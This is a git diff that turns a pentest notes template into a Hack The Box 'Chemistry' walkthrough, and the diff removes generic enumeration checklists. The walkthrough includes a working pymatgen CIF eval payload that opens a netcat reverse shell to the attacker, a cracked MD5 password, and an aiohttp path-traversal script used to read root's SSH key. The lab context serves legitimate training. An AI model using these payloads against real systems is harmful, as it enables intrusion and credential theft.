@@ -1,4 +1,4 @@
-Tags: 
+Tags: #Linux/Ubuntu #Easy #Python #Werkzeug #RCE #Weak-Hashing-Algorithms  #Password-Cracking #Outdated-software #LFI
 # **Nmap Results**
 
 ```text
@@ -97,389 +97,227 @@ Service detection performed. Please report any incorrect results at https://nmap
 <br>
 
 # **Service Enumeration**
-Nmap results found a Python Werkzeug web server on port 5000
+Nmap results found a Python Werkzeug web server on port 5000, so I will navigate there in my browser to see what I can find:
 
+![[Pasted image 20241229110517.png]]
 
+Looks to be a site that processes CIF files, which contain data on the arrangement of atoms within a crystal. We have the option to login but we can also register, which is what we'll do for now. We'll just use simple credentials like test:test. Here's the dashboard we get after logging in:
+
+![[Pasted image 20241229110916.png]]
+
+They provide us an example .cif file to download. Let's take a look at it:
+
+![[Pasted image 20241229111723.png]]
+
+I know that the webserver is running on python, so the cif parser is most likely written in python as well. I quickly search online for "python CIF processor RCE POC" and immediately get multiple results about a library "pymatgen" that has a critical RCE vulnerability:
+
+![[Pasted image 20241229130235.png]]
+
+Github usually has reliable POC scripts so I click on the [first result](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f) and examine the nature of the exploit. 
 <br>
 <br>
 # **Exploitation**
 ## **Initial Access**
-Document here:
-* Exploit used (link to exploit)
-* Explain how the exploit works against the service
-* Any modified code (and why you modified it)
-* Proof of exploit (screenshot of reverse shell with target IP address output)
+The post explains that the vulnerability arises from python's use of the `eval()` function "even with \_\_builtins\_\_ set to None". An attacker can use subclass traversal and access the `BuiltinImporter` class, allowing them to import any module they want. On top of that, since there is no input sanitization, an attacker can execute python code with the privileges of the user running the server. 
 
+The author then provides a malicious .cif file with the subclass traversal payload. It accesses the `BuiltinImporter` class, loads the `os` module, and calls the `system()` function, allowing the execution of system level commands. Right now it just creates a file named "pwned", but we can insert a reverse shell one liner like `busybox nc 10.10.14.10 9001 -e sh` while having a listener set up to obtain a shell. I created a file "payload.cif", pasted the exploit from github, and inserted the command. Here's what it looks like:
+
+```
+data_5yOhtAoR
+_audit_creation_date            2018-06-08
+_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"
+
+loop_
+_parent_propagation_vector.id
+_parent_propagation_vector.kxkykz
+k1 [0 0 0]
+
+_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("busybox nc 10.10.14.10 9001 -e sh");0,0,0'
+
+
+_space_group_magn.number_BNS  62.448
+_space_group_magn.name_BNS  "P  n'  m  a'  "
+```
+
+![[Pasted image 20241229140845.png]]
+
+After I clicked on view, my listener caught the request and I'm now logged in as **app**. 
+![[Pasted image 20241229141002.png]]
+
+I want to see if there are other users on the machine so I run `cat /etc/passwd | grep sh$` so that only users with interactive shells are printed on the screen:
+
+```
+root:x:0:0:root:/root:/bin/bash
+rosa:x:1000:1000:rosa:/home/rosa:/bin/bash
+app:x:1001:1001:,,,:/home/app:/bin/bash
+
+```
+
+We want to escalate privileges to rosa, so we'll do some local enumeration. Right now I'm placed in the **/home/app** directory:
+
+![[Pasted image 20241229142053.png]]
+
+app.py is the configuration of the python webserver. Looking at its contents there is one line of interest
+
+![[Pasted image 20241229142404.png]]
+
+The web server uses a sqlite database and the secret key is `MyS3cretCh3mistry4PP`. The secret key isn't useful here because we don't need to forge cookies or perform CSRF attacks, as we already have a shell on the machine.
+
+Looking around, there is a **database.db** file in the **instance** directory. There should be some valuable info inside:
+
+![[Pasted image 20241229143033.png]]
+
+I found Rosa's password hash. Looks to be an MD5 hash. Hashes.com confirmed it and cracked the hash for us too:
+
+![[Pasted image 20241229143228.png]]
+
+Her password is `unicorniosrosados`. Next step would be to try and SSH into the box with these creds:
+
+![[Pasted image 20241229143407.png]]
+
+Boom, we're logged in as Rosa now.
 <br>
 <br>
 
 ## **Post-Exploit Enumeration**
 ### **Operating Environment**
 
-> [!tldr]- OS &amp; Kernel
->Document here:
->- Windows
->    - `systeminfo` or `Get-ComputerInfo` output
->    - Check environment variables:
- >       - CMD: `set`
- >       - PowerShell: `Get-ChildItem Env:\`
->
->- *nix
->    - `uname -a` output
->    - `cat /etc/os-release` (or similar) output
->    - Check environment variables:
->       - `env` or `set`
-
 > [!tldr]- Current User
-> Document here:
-> - Windows
->     - `whoami /all` output
->   
-> - *nix
->     - `id` output
->     - `sudo -l` output
-
-<br>
-
-### **Users and Groups**
-
-> [!tldr]- Local Users
-> Document here any interesting username(s) after running the below commands:
-> - Windows
->     - `net user` or `Get-LocalUser` output
->     - `net user <username>` or `Get-LocalUser <username> | Select-Object *` to enumerate details about specific users
->     - Can you dump and pass/crack hashes from SAM using your current access?
-> 
-> - *nix
->     - `cat /etc/passwd` output
-
-> [!tldr]- Local Groups
-> Document here any interesting group(s) after running the below commands:
-> - Windows
->     - `net localgroup` or `Get-LocalGroup` output
->     - `net localgroup <group_name>` or `Get-LocalGroupMember <group_name> | Select-Object *` to enumerate users of specific groups
->   
-> - *nix
->     - `cat /etc/group` output
->     - `cat /etc/group | grep <username>` to check group memberships of specific users
-
-> [!tldr]- Domain Users (Standalone Domain Controller or Network)
-> Document here any interesting username(s) after running the below commands:
-> - Windows
->     - `net user /domain` or `Get-ADUser -Filter * -Properties *` output
->     - `net user <username> /domain` or `Get-ADUser -Identity <username> -Properties *` to enumerate details about specific domain users
->     - Not a local administrator and can't run PowerShell AD cmdlets?
->       - See here: https://notes.benheater.com/books/active-directory/page/powershell-ad-module-on-any-domain-host-as-any-user
->     - Can you dump and pass/crack local user / admin hashes from the SAM using your current access?
->     - Can you dump and pass/crack hashes from LSA using your current access?
-> 
-> - *nix
->     - Check if joined to a domain
->       - /usr/sbin/realm list -a
->       - /usr/sbin/adcli info <realm_domain_name>
-> 
->     - No credential:
-> 
->       - Check for log entries containing possible usernames
-> 
->         - `find /var/log -type f -readable -exec grep -ail '<realm_domain_name>' {} \; 2>/dev/null`
->         - Then, grep through each log file and remove any garbage from potential binary files:
-> 
->           - Using strings: `strings /var/log/filename | grep -i '<realm_domain_name>'`
->           - If strings not available, try using od: `od -An -S 1 /var/log/filename | grep -i '<realm_domain_name>'`
->           - If od not available, try grep standalone: `grep -iao '.*<realm_domain_name>.*' /var/log/filename`
-> 
->         - Validate findings:
->           - Check if discovered usernames are valid: `getent passwd <domain_username>`
->           - If valid, check user group memberships: List `id <domain_username>`
->         - Check domain password and lockout policy for password spray feasibility
-> 
->       - See `Domain Groups`, as certain commands there can reveal some additional usernames
-> 
->      - With a domain credential:
-> 
->        - If you have a valid domain user credential, you can try `ldapsearch`
->        - Dump all objects from LDAP: `ldapsearch -x -H ldap://dc-ip-here -D 'CN=username,DC=realmDomain,DC=realmTLD' -W -b 'DC=realmDomain,DC=realmTLD' 'objectClass=*'`
->        - Dump all users from LDAP: `ldapsearch -x -H ldap://dc-ip-here -D 'CN=username,DC=realmDomain,DC=realmTLD' -W -b 'DC=realmDomain,DC=realmTLD' 'objectClass=account'`
-> 
-> 
->     - If you're root on the domain-joined host:
-> 
->        - You can try best-effort dumping the SSSD cache:
-> 
->          - Using strings: `strings /var/lib/sss/db/cache_<realm_domain_name>.ldb | grep -iE '[ou|cn]=.*user.*'` | grep -iv 'disabled' | sort -u
->          - If strings not available, try using od: `od -An -S 1 /var/lib/sss/db/cache_<realm_domain_name>.ldb | grep -iE '[ou|cn]=.*user.*'` | grep -iv 'disabled' | sort -u
->          - If od not available, try grep standalone: `grep -iao '.*<realm_domain_name>.*' /var/lib/sss/db/cache_<realm_domain_name>.ldb | sed 's/[^[:print:]\r\t]/\n/g' | grep -iE '[ou|cn]=.*user.*' | grep -iv disabled`
-> 
->        - You can transfer the SSSD TDB cache for local parsing
-> 
->          - Default file path: /var/lib/sss/db/cache_<realm_domain_name>.tdb
->          - You can dump this file with tools such as `tdbtool` or `tdbdump`
-
-> [!tldr]- Domain Groups (Standalone Domain Controller or Network)
-> Document here any interesting group(s) after running the below commands:
-> - Windows
->     - `net group /domain` or `Get-ADGroup -Filter * -Properties *` output
->     - `net group <group_name> /domain` or `Get-ADGroup -Identity <group_name> | Get-ADGroupMember -Recursive` to enumerate members of specific domain groups
->     - Not a local administrator and can't run PowerShell AD cmdlets?
->       - See here: https://notes.benheater.com/books/active-directory/page/powershell-ad-module-on-any-domain-host-as-any-user
-> 
-> - *nix
-> 
->     - Check if joined to a domain
->       - /usr/sbin/realm list -a
->       - /usr/sbin/adcli info <realm_domain_name>
-> 
->     - No credential:
-> 
->       - Enumerate default Active Directory security groups: https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#default-active-directory-security-groups
-> 
->         - `getent group 'Domain Admins@<realm_domain_name>'`
->         - `getent group 'Domain Users@<realm_domain_name>'`
->         - NOTE: `getent` will only return domain group members that have been cached on the local system, not all group members in the domain
->         - This can still build a substantial user list for password spraying (check domain password and lockout policy)
-> 
->     - With a domain credential:
-> 
->        - If you have a valid domain user credential, you can try `ldapsearch`
->        - Dump all objects from LDAP: `ldapsearch -x -H ldap://dc-ip-here -D 'CN=username,DC=realmDomain,DC=realmTLD' -W -b 'DC=realmDomain,DC=realmTLD' 'objectClass=*'`
->        - Dump all groups from LDAP: `ldapsearch -x -H ldap://dc-ip-here -D 'CN=username,DC=realmDomain,DC=realmTLD' -W -b 'DC=realmDomain,DC=realmTLD' 'objectClass=group'`
-> 
->     - If you're root on the domain-joined host:
-> 
->        - You can try dumping the SSSD cache:
-> 
->          - Using strings: `strings /var/lib/sss/db/cache_<realm_domain_name>.ldb | grep -i '<realm_domain_name>'`
->          - If strings not available, try using od: `od -An -S 1 /var/lib/sss/db/cache_<realm_domain_name>.ldb | grep -i '<realm_domain_name>'`
->          - If od not available, try grep standalone: `grep -iao '.*<realm_domain_name>.*' /var/lib/sss/db/cache_<realm_domain_name>.ldb | sed 's/[^[:print:]\r\t]/\n/g' | grep -iE '[ou|cn]=.*group.*' | grep -i '^CN='`
-> 
->        - You can transfer the SSSD TDB cache for local parsing
-> 
->          - Default file path: /var/lib/sss/db/cache_<realm_domain_name>.tdb
->          - You can dump this file with tools such as `tdbtool` or `tdbdump`
-
+> - `id` output:
+>	`uid=1000(rosa) gid=1000(rosa) groups=1000(rosa)`
+> - `sudo -l` output:
+>	`Sorry, user rosa may not run sudo on chemistry.`
 <br>
 
 ### **Network Configurations**
 
-> [!tldr]- Network Interfaces
-> Document here any interesting / additional interfaces:
->   
-> - Windows
->     - `ipconfig` or `Get-NetAdapter` output
->   
-> - *nix
->     - `ip address` or `ifconfig` output
-
 >[!tldr]- Open Ports
-> Document here any ports listening on loopback or not available to the outside:
->   
-> - Windows
->     - `netstat -ano | findstr /i listening` or `Get-NetTCPConnection -State Listen` output
->   
-> - *nix
->     - `netstat -tanup | grep -i listen` or `ss -tanup | grep -i listen` output
-
-> [!tldr]- ARP Table
->
-> If targeting a network and enumerating additional hosts...
-> Document here:
->
-> - Windows
->     - `arp -a` or `Get-NetNeighbor` output
-> - *nix
->     - `ip neigh` or `arp -a` output
-
-> [!tldr]- Routes
->
-> If targeting a network and enumerating additional hosts...
-> Document here:
->
-> - Windows
->     - `route print` or `Get-NetRoute` output
-> - *nix
->     - `ip route` or `route` output
-
-> [!tldr]- Ping Sweep
->
-> If the host has access to additional routes / interfaces:
->
->- Look at the IP address space and network mask
->- Find a ping sweep script that will work for the target network
->- Or you could try:
->	- Transfering `nmap` or some other host discover tool to the host
->	- Set up a SOCKS proxy and try a port scan through the foothold
+>`netstat -tanup | grep LISTEN` output:
+>```
+> (Not all processes could be identified, non-owned process info
+>  will not be shown, you would have to be root to see it all.)
+> tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
+> tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+> tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+> tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      -                   
+> tcp6       0      0 :::22                   :::*                    LISTEN      - 
+>```
 
 <br>
 
 ### **Processes and Services**
 
 > [!tldr]- Interesting Processes
->
-> First...
-> Enumerate processes:
->
-> - Windows
->     - `tasklist`
->     - `Get-Process`
->     - `Get-CimInstance -ClassName Win32_Process | Select-Object Name, @{Name = 'Owner' ; Expression = {$owner = $_ | Invoke-CimMethod -MethodName GetOwner -ErrorAction SilentlyContinue ; if ($owner.ReturnValue -eq 0) {$owner.Domain + '\' + $owner.User}}}, CommandLine | Sort-Object Owner | Format-List`
->
-> - *nix
->     - `ps aux --sort user`
->
-> Then...
-> Document here:
->    - Any interesting processes run by users/administrators
->    - Any vulnerable applications
->    - Any intersting command line arguments visible
-
-> [!tldr]- Interesting Services
->
-> - Windows
->     - First...
->     Enumerate services:
->           - `sc.exe query`
->               - Then `sc.exe qc <service-name>`
->             - List the configuration for any interesting services
->           - `Get-CimInstance -ClassName Win32_Service | Select-Object Name, StartName, PathName | Sort-Object Name | Format-List`
->     - Then...
->       Check for things like:
->           - Vulnerable service versions
->         - Unquoted service path
->         - Service path permissions too open?
->           - Can you overwrite the service binary?
->           - DLL injection?
->
-> - *nix
->     - First...
->       Enumerate services:
->         - `service --status-all` or `systemctl list-units --type=service --state=running`
->     - Then...
->     Check for things like:
->         - Vulnerable service versions
->         - Configuration files with passwords or other information
->         - Writable unit files
->             - One-liner to check for writable service unit files: `systemctl list-units --state=running --type=service | grep '\.service' | awk -v FS=' ' '{print $1}' | xargs -I % systemctl status % | grep 'Loaded:' | cut -d '(' -f 2 | cut -d ';' -f 1 | xargs -I % find % -writable 2>/dev/null`
->           - Writable service binaries
->
-> Then...
-> Document here:
->    - Any interesting services or vulnerabilities
->    - Any vulnerable service versions
->    - Any intersting configuration files
-
-<br>
-
-### **Scheduled Tasks**
-
-> [!tldr]- Interesting Scheduled Tasks
->
-> First...
-> Enumerate scheduled tasks:
->
-> - Windows
->     - `schtasks /QUERY /FO LIST /V | findstr /i /c:"taskname" /c:"run as user" /c:"task to run"`
->     - `Get-CimInstance -Namespace Root/Microsoft/Windows/TaskScheduler -ClassName MSFT_ScheduledTask | Select-Object TaskName, @{Name = 'User' ; Expression = {$_.Principal.UserId}}, @{Name = 'Action' ; Expression = {($_.Actions.Execute + ' ' + $_.Actions.Arguments)}} | Format-List`
-> - *nix
->     - `crontab -l`
->     - `cat /etc/cron* 2>/dev/null`
->     - `cat /var/spool/cron/crontabs/* 2>/dev/null`
->
-> Then...
-> Document here:
->    - Any interesting scheduled tasks
->    - Any writable paths in the scheduled task
->    - Any intersting command line arguments visible
-
+> Interesting process running as root, found by `ps aux | grep root`:
+> `root        1073  1.3  2.6 280880 52372 ?        Rsl  15:41   3:50 /usr/bin/python3.9 /opt/monitoring_site/app.py`
 <br>
 
 ### **Interesting Files**
 
-> [!tldr]- C:\InterestingDir\Interesting-File1.txt
->
->
-> - Windows
->     - Check for writable files and directories
->         - See https://github.com/0xBEN/CTF-Scripts/blob/main/HackTheBox/Axlle/Find-FileAccess.ps1
->     - Check for configuration files with passwords and other interesting info
->     - Check for scripts with external dependencies that can be overwritten or changed
->     - Some interesting places to check
->       - Check `PATH` variable for current user for possible interesting locations
-> 	      - CMD: `echo %PATH%`
-> 	      - PowerShell: `$env:Path`
->       - Also check for hidden items
->       - PowerShell History File: `(Get-PSReadLineOption).HistorySavePath`
->       - I reference `%SYSTEMDRIVE%`, as `C:` is not always the system volume
->           - `%SYSTEMDRIVE%\interesting_folder`
->           - `%SYSTEMDRIVE%\Users\user_name`
->               - Desktop, Downloads, Documents, .ssh, etc
->               - AppData (may also have some interesting things in Local, Roaming)
->           - `%SYSTEMDRIVE%\Windows\System32\drivers\etc\hosts`
->           - `%SYSTEMDRIVE%\inetpub`
->           - `%SYSTEMDRIVE%\Program Files\program_name`
->           - `%SYSTEMDRIVE%\Program Files (x86)\program_name`
->           - `%SYSTEMDRIVE%\ProgramData`
->           - `%SYSTEMDRIVE%\Temp`
->           - `%SYSTEMDRIVE%\Windows\Temp`
->       - Check the Registry for passwords, configurations, interesting text
->           - `HKEY_LOCAL_MACHINE` or `HKLM`
->           - `HKEY_CURRENT_USER` or `HKCU`
->           - Search the `HKLM` hive recursively for the word `password`
->               - `reg query HKLM /f password /t REG_SZ /s`
->
-> - *nix
->     - Check for SUID binaries
->         - `find / -type f -perm /4000 -exec ls -l {} \; 2>/dev/null`
->     - Check for interesting / writable scripts, writable directories or files
->         - `find /etc -writable -exec ls -l {} \; 2>/dev/null`
->         - `find / -type f \( -user $(whoami) -o -group $(whoami) \) -exec ls -l {} \; 2>/dev/null
->     - Check for configuration files with passwords and other interesting info
->     - Check for scripts with external dependencies that can be overwritten or changed
->     - Use strings on interesting binaries to check for relative binary names and $PATH hijacking
->     - Some interesting places to check (check for hidden items)
->       - Check `PATH` variable for current user for possible interesting locations: `echo $PATH`
->       - `/interesting_folder`
->       - `/home/user_name`
->         - `.profile`
->         - `.bashrc`, `.zshrc`
->         - `.bash_history`, `.zsh_history`
->         - Desktop, Downloads, Documents, .ssh, etc.
->         - PowerShell History File: `(Get-PSReadLineOption).HistorySavePath`
->       - `/var/www/interesting_folder`
->       - `/var/mail/user_name`
->       - `/opt/interesting_folder`
->       - `/usr/local/interesting_folder`
->       - `/usr/local/bin/interesting_folder`
->       - `/usr/local/share/interesting_folder`
->       - `/etc/hosts`
->       - `/tmp`
->       - `/mnt`
->       - `/media`
->       - `/etc`
->         - Look for interesting service folders
->         - Check for readable and/or writable configuration files
->         - May find cleartext passwords
-
-> [!tldr]- /opt/interesting_dir/interesting-file2.txt
->
-> Add full file contents
-> Or snippet of file contents
-
+> [!tldr]- /opt/monitoring_site
+> Unable to view or edit contents due to insufficient permissions
 <br>
 <br>
 
 # **Privilege Escalation**  
+Local enumeration revealed there was something listening locally on port 8080, so I exited the SSH session and logged back with port forwarding to expose that port, allowing me to see what's there. The command I used to do that was: `ssh -L 8080:localhost:8080 rosa@10.10.11.38`, which tells my local machine to forward all requests made to it through port 8080 to the remote server's local machine on port 8080. So when I navigate to localhost:8080 on my browser, that connection will get sent through the SSH tunnel and the remote machine will respond.
 
-Document here:
-* Exploit used (link to exploit)
-* Explain how the exploit works 
-* Any modified code (and why you modified it)
-* Proof of privilege escalation (screenshot showing ip address and privileged username)
+The output of `netstat` didn't tell me the process bound to that port but I guessed it was a web server because 8080 is a common port for web servers besides 80. Here's what I see in my browser:
+
+![[Pasted image 20241229165454.png]]
+
+Turns out it was a web server after all. It's also being ran as root, according to the output of `ps aux | grep root`. There is a button "List Services" that allows us to see services that are running and others that are stopped, but the Start and Stop Service buttons are non functional. 
+
+We need more info about this webpage, so we'll run `whatweb` against it. Here's what we get:
+
+```
+WhatWeb report for http://localhost:8080
+Status    : 200 OK
+Title     : Site Monitoring
+IP        : <Unknown>
+Country   : <Unknown>
+
+Summary   : HTML5, HTTPServer[Python/3.9 aiohttp/3.9.1], JQuery[3.6.0], Script
+
+Detected Plugins:
+[ HTML5 ]
+        HTML version 5, detected by the doctype declaration 
+
+
+[ HTTPServer ]
+        HTTP server header string. This plugin also attempts to 
+        identify the operating system from the server header. 
+
+        String       : Python/3.9 aiohttp/3.9.1 (from server string)
+
+[ JQuery ]
+        A fast, concise, JavaScript that simplifies how to traverse 
+        HTML documents, handle events, perform animations, and add 
+        AJAX. 
+
+        Version      : 3.6.0
+        Website     : http://jquery.com/
+
+[ Script ]
+        This plugin detects instances of script HTML elements and 
+        returns the script language/type. 
+
+
+HTTP Headers:
+        HTTP/1.1 200 OK
+        Content-Type: text/html; charset=utf-8
+        Content-Length: 5971
+        Date: Sun, 29 Dec 2024 21:57:30 GMT
+        Server: Python/3.9 aiohttp/3.9.1
+        Connection: close
+
+``` 
+
+The scan discovers that the webserver uses **aiohttp 3.9.1**. Now we need to see if we can find any known vulnerabilities and a POC to go with it. There are many sites online talking about a path traversal vulnerability, but I chose to look at the one [on GitHub](https://github.com/z3rObyte/CVE-2024-23334-PoC):
+
+![[Pasted image 20241229170841.png]]
+
+Fortunately there is also a poc attached, which we will use. I made a few changes to match my target, like changing the port number and the directory in the **payload** variable (/static/ was the original directory, it didn't exist on the site) and then executed the script:
+```bash
+#!/bin/bash
+
+url="http://localhost:8080"
+string="../"
+payload="/assets/"
+file="etc/passwd" # without the first /
+
+for ((i=0; i<15; i++)); do
+    payload+="$string"
+    echo "[+] Testing with $payload$file"
+    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
+    echo -e "\tStatus code --> $status_code"
+    
+    if [[ $status_code -eq 200 ]]; then
+        curl -s --path-as-is "$url$payload$file"
+        break
+    fi
+done
+```
+
+![[Pasted image 20241229174028.png]]
+
+It successfully returned the /etc/passwd file. Since this server is running as root, our LFI script has the same privileges, meaning it can retrieve any file on the system. We could just grab the root flag from here but the point is to obtain access to the root user (at least that's what I think), so we have to grab a file that will lead us closer to a root shell. 
+
+If the root user has a private key, we can get that through the script and use it to SSH into the box. The path to that would normally be /root/.ssh/id_rsa, so I modified the script and executed it:
+
+![[Pasted image 20241229174543.png]]
+
+Excellent. All I had to do now was save it to a file "id_rsa", change it's permissions with `sudo chmod 600 id_rsa` so that ssh will allow the key to be used, and run `ssh -i id_rsa root@10.10.11.38`:
+
+![[Pasted image 20241229174826.png]]
+
+That's it! We're root!
 <br>
 <br>
-# Skills Learned
-Document here what you've learned after completing the box
+# Skills/Concepts Learned
+- **Even with limited info, use google to your advantage**. In the service enumeration step, I knew that python was running the web server but I didn't know the exact library that was in use. However a simple "python CIF processor RCE POC" search in this case will at least lead you in the right direction, if it doesn't give you the answer. 
+- `whatweb` is a powerful tool for enumerating a website's underlying technologies, such as web servers, CMS, JS libraries, security features (WAF, HTTPS, etc.), and more. It has hundreds of different plugins to extend detection capabilities. **Use it in conjunction with basic enumeration techniques if needed and/or when Wappalyzer fails to discover sufficient info** 
 <br>
 <br>
 # Proof of Pwn
-Paste link to HTB Pwn notification after owning root
+https://www.hackthebox.com/achievement/machine/391579/631
